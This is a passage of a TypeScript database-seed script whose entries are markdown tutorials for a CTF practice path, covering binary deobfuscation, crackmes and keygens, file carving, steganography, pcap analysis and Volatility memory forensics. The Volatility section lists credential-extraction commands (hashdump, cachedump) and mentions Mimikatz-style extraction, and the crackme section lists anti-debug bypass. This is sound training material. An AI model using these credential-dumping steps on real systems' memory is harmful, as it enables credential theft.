if (x * x >= 0) {  // Always true for integers
    real_code();
}
\`\`\`
\`\`\`
Approach:
- Trace execution to see which branch taken
- Pattern match and simplify
\`\`\`

### Control Flow Flattening
\`\`\`c
// Turns structured code into switch-based
int state = 0;
while (1) {
    switch (state) {
        case 0: a(); state = 3; break;
        case 1: return; break;
        case 2: c(); state = 1; break;
        case 3: b(); state = 2; break;
    }
}
\`\`\`
\`\`\`
Approach:
- Trace state variable
- Rebuild original flow
\`\`\`

### Virtual Machines
\`\`\`
Structure:
1. Bytecode array
2. Dispatcher loop
3. Handler for each opcode

Approach:
1. Identify dispatcher
2. Map opcode to handler
3. Document each handler
4. Disassemble bytecode
\`\`\`

### Deobfuscation Script Example
\`\`\`python
# Trace-based deobfuscation
import angr

proj = angr.Project('./obfuscated')
state = proj.factory.entry_state()
simgr = proj.factory.simgr(state)

# Explore to find path to success
simgr.explore(find=success_addr, avoid=fail_addr)

if simgr.found:
    solution = simgr.found[0]
    print(solution.posix.dumps(0))  # stdin
\`\`\`

### Tools
\`\`\`
- angr: Symbolic execution
- Triton: Dynamic binary analysis
- Miasm: RE framework
- Binary Ninja: Commercial, good deobfuscation
\`\`\`

## Completion Criteria
- [ ] Recognized obfuscation patterns
- [ ] Manually traced VM execution
- [ ] Used symbolic execution
- [ ] Wrote deobfuscation helper`],

	['Complete 5 reversing challenges', 'Solve challenges from crackmes.one and CTFs. Progress from simple keygens to complex VMs.',
`## Reversing Practice

### crackmes.one
\`\`\`
Difficulty progression:
1. Very easy: Simple strcmp
2. Easy: Basic algorithm
3. Medium: Anti-debug, packing
4. Hard: Custom encryption
5. Insane: VMs, heavy obfuscation
\`\`\`

### Challenge Log Template
\`\`\`markdown
## Challenge: [Name]
**Difficulty**: Easy/Medium/Hard
**Platform**: Linux/Windows

### Initial Analysis
- File type: ELF 64-bit
- Packed: No
- Anti-debug: Yes - IsDebuggerPresent

### Key Findings
1. Password checked in function at 0x401234
2. XOR encryption with key 0x42
3. Expected hash compared at end

### Solution
[Keygen code or explanation]

### Time Spent
- Analysis: 1 hour
- Solving: 30 min
\`\`\`

### Progression Path
\`\`\`
Week 1: 3 very easy (strcmp, simple math)
Week 2: 3 easy (XOR, basic algo)
Week 3: 2 medium (packing, anti-debug)
Week 4: 1-2 hard (encryption, VM)
\`\`\`

### Skills to Develop
\`\`\`
☐ Static analysis workflow
☐ Keygen writing
☐ Unpacking binaries (UPX, custom)
☐ Anti-debug bypass
☐ Algorithm reconstruction
☐ VM analysis
\`\`\`

### Resources
- crackmes.one
- reversing.kr
- CTFtime RE challenges
- Flare-On archives

## Completion Criteria
- [ ] Solved 5 challenges
- [ ] At least 2 medium difficulty
- [ ] Wrote keygen for one
- [ ] Documented analysis process`],
];
ctfM4Tasks.forEach((t, i) => insertTask.run(ctfM4.lastInsertRowid, t[0], t[1], t[2], i, now));

// Module 5: Forensics
const ctfM5 = insertModule.run(ctfPath.lastInsertRowid, 'Forensics & Steganography', 'Extract hidden data and analyze artifacts', 4, now);
const ctfM5Tasks: [string, string, string][] = [
	['Master file format analysis', 'Learn magic bytes, file carving with binwalk, and fixing corrupted files. Extract embedded files from various formats.',
`## File Format Analysis

### Magic Bytes (File Signatures)
\`\`\`
PNG:  89 50 4E 47 0D 0A 1A 0A
JPEG: FF D8 FF
PDF:  25 50 44 46 (%PDF)
ZIP:  50 4B 03 04
GIF:  47 49 46 38 (GIF8)
ELF:  7F 45 4C 46
\`\`\`
\`\`\`bash
# Check file type
file mystery_file
xxd mystery_file | head
\`\`\`

### binwalk Analysis
\`\`\`bash
# Scan for embedded files
binwalk suspicious.png

# Extract all
binwalk -e suspicious.png

# Recursive extraction
binwalk -eM suspicious.png
\`\`\`

### Fixing Corrupted Files

#### Corrupted PNG
\`\`\`bash
# Check structure
pngcheck image.png

# Common fixes:
# - Correct magic bytes
# - Fix CRC checksum
# - Repair chunk headers
\`\`\`

#### Corrupted ZIP
\`\`\`bash
# Repair
zip -FF broken.zip --out fixed.zip

# Force extract
7z x -y broken.zip
\`\`\`

### Tools
\`\`\`
file - Identify file type
xxd - Hex dump
binwalk - Find embedded files
foremost - File carving
scalpel - Advanced carving
010 Editor - Hex templates
\`\`\`

## Completion Criteria
- [ ] Recognize common file signatures
- [ ] Extract embedded files with binwalk
- [ ] Repair a corrupted file
- [ ] Use hex editor effectively`],

	['Analyze memory dumps', 'Use Volatility for CTF challenges. Extract passwords, process info, network connections, and hidden data.',
`## Volatility for CTFs

### Profile Detection
\`\`\`bash
# Volatility 3 (auto-detects)
vol -f memory.dmp windows.info

# Volatility 2 (needs profile)
vol.py -f memory.dmp imageinfo
vol.py -f memory.dmp --profile=Win7SP1x64 pslist
\`\`\`

### Common CTF Tasks

#### Extract Passwords
\`\`\`bash
# Cached credentials
vol -f mem.dmp windows.cachedump
vol -f mem.dmp windows.hashdump

# Browser passwords (plugin dependent)
# Mimikatz-style extraction
\`\`\`

#### Process Analysis
\`\`\`bash
# List processes
vol -f mem.dmp windows.pslist
vol -f mem.dmp windows.pstree

# Suspicious process? Dump it
vol -f mem.dmp windows.dumpfiles --pid 1234
\`\`\`

#### Network Connections
\`\`\`bash
vol -f mem.dmp windows.netstat
vol -f mem.dmp windows.netscan
\`\`\`

#### Find Hidden Data
\`\`\`bash
# Command history
vol -f mem.dmp windows.cmdline

# Clipboard
vol -f mem.dmp windows.clipboard

# Files in memory
vol -f mem.dmp windows.filescan | grep -i flag
vol -f mem.dmp windows.dumpfiles --virtaddr 0x...
\`\`\`

### Linux Memory
\`\`\`bash
vol -f mem.dmp linux.bash
vol -f mem.dmp linux.pslist
vol -f mem.dmp linux.proc.maps
\`\`\`

## Completion Criteria
- [ ] Identified memory profile
- [ ] Listed processes
- [ ] Extracted files from memory
- [ ] Found hidden credentials`],

	['Solve steganography challenges', 'Use: strings, exiftool, steghide, zsteg, stegsolve. Learn LSB extraction and various stego techniques.',
`## Steganography Toolkit

### Initial Analysis
\`\`\`bash
# Check for obvious strings
strings image.png | grep -i flag

# Check metadata
exiftool image.png

# Check file for anomalies
file image.png
binwalk image.png
\`\`\`

### Image Steganography

#### PNG Analysis
\`\`\`bash
# Check LSB
zsteg image.png
zsteg -a image.png  # All possibilities

# View color planes
stegsolve.jar
# Click through: Red/Green/Blue planes, LSB, etc.
\`\`\`

#### JPEG Analysis
\`\`\`bash
# Extract embedded data
steghide extract -sf image.jpg
# (may need password, try common ones)

# Analyze structure
stegdetect image.jpg
\`\`\`

### Audio Steganography
\`\`\`bash
# Spectrogram (visual hidden in audio)
audacity → Analyze → Plot Spectrum
# Or
sox audio.wav -n spectrogram

# LSB in audio
stegolsb wavsteg -r -i audio.wav -o output.txt
\`\`\`

### Common Hiding Methods
\`\`\`
1. Appended data (after EOF marker)
2. LSB (Least Significant Bit)
3. Metadata (EXIF, comments)
4. Color palette manipulation
5. Alpha channel
6. Whitespace/invisible characters
\`\`\`

### Password Guessing
\`\`\`
Common stego passwords:
- password, 123456
- Filename without extension
- Text visible in image
- CTF name
\`\`\`

## Completion Criteria
- [ ] Checked strings and metadata
- [ ] Used zsteg and stegsolve
- [ ] Extracted steghide data
- [ ] Found flag in unusual location`],

	['Analyze network captures', 'Extract data from pcaps with Wireshark and tshark. Reassemble streams, find hidden channels, decode protocols.',
`## PCAP Analysis

### Wireshark Basics
\`\`\`
# Quick filters
http
tcp.port == 80
ip.addr == 192.168.1.1
dns
ftp-data

# Follow stream
Right-click packet → Follow → TCP Stream
\`\`\`

### tshark CLI
\`\`\`bash
# List conversations
tshark -r capture.pcap -q -z conv,tcp

# Extract HTTP objects
tshark -r capture.pcap --export-objects http,./output

# Filter and show fields
tshark -r capture.pcap -Y "http" -T fields -e http.host -e http.request.uri
\`\`\`

### Common CTF Patterns

#### Hidden in HTTP
\`\`\`bash
# Export all HTTP objects
File → Export Objects → HTTP

# Look for:
- Downloaded files
- POST data
- Cookies with base64
\`\`\`

#### DNS Tunneling
\`\`\`bash
# Filter DNS
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name

# Look for:
- Long subdomain queries
- Base64/hex in queries
- High volume to single domain
\`\`\`

#### FTP Transfer
\`\`\`bash
# FTP commands
tshark -r capture.pcap -Y "ftp"

# FTP data (different port!)
tshark -r capture.pcap -Y "ftp-data"
# Follow stream to extract file
\`\`\`

### Data Extraction
\`\`\`bash
# Extract all files
foremost -i capture.pcap

# Specific protocol
tcpflow -r capture.pcap
\`\`\`

## Completion Criteria
- [ ] Filtered traffic effectively
- [ ] Followed TCP streams
- [ ] Extracted files from HTTP
- [ ] Identified covert channel`],

	['Complete 5 forensics challenges', 'Solve forensics challenges from CTFs. Combine multiple techniques in single challenges.',
`## Forensics Challenge Practice

### Challenge Sources
\`\`\`
- picoCTF: Forensics category
- CTFtime.org: Recent CTF forensics
- HackTheBox Challenges: Forensics
- TryHackMe: Forensics rooms
- Forensics CTF dataset archives
\`\`\`

### Methodology
\`\`\`
1. Initial Triage
   - What type of file/data?
   - Run file, strings, binwalk
   - Check for obvious flags

2. Deep Analysis
   - Apply appropriate tool for type
   - Memory → Volatility
   - Image → Stegsolve, zsteg
   - PCAP → Wireshark
   - Disk → Autopsy

3. Look for Anomalies
   - Timestamps
   - Hidden files
   - Deleted data
   - Unusual patterns

4. Combine Techniques
   - Extract from PCAP → analyze image
   - Memory dump → find encryption key → decrypt file
\`\`\`

### Challenge Log
\`\`\`markdown
## Challenge: [Name]
**CTF**: [Event]
**Points**: XX

### Type
☐ Memory forensics
☐ Disk forensics
☐ Network (PCAP)
☐ Steganography
☐ File format

### Tools Used
- [List tools]

### Solution Path
1. [Step 1]
2. [Step 2]
3. [Flag found in...]

### Key Techniques
- [What worked]
- [What didn't]
\`\`\`

### Tool Quick Reference
\`\`\`
Memory: volatility, strings
Disk: autopsy, sleuthkit
Network: wireshark, tshark, tcpflow
Images: stegsolve, zsteg, steghide
Files: binwalk, foremost, file
General: strings, xxd, exiftool
\`\`\`

## Completion Criteria
- [ ] Solved 5 challenges
- [ ] Used multiple forensics types
- [ ] Combined techniques in one challenge
- [ ] Documented methodology`],
];
ctfM5Tasks.forEach((t, i) => insertTask.run(ctfM5.lastInsertRowid, t[0], t[1], t[2], i, now));

console.log('Seeded 4 new security learning paths:');
console.log('  - Blue Team & Defensive Security (4 modules, 24 tasks)');
console.log('  - Red Team Extended: Web, Cloud & Mobile (3 modules, 21 tasks)');
console.log('  - DevSecOps Engineering (3 modules, 19 tasks)');
console.log('  - CTF Challenge Practice (5 modules, 25 tasks)');
console.log('Total: 89 new tasks added!');

sqlite.close();
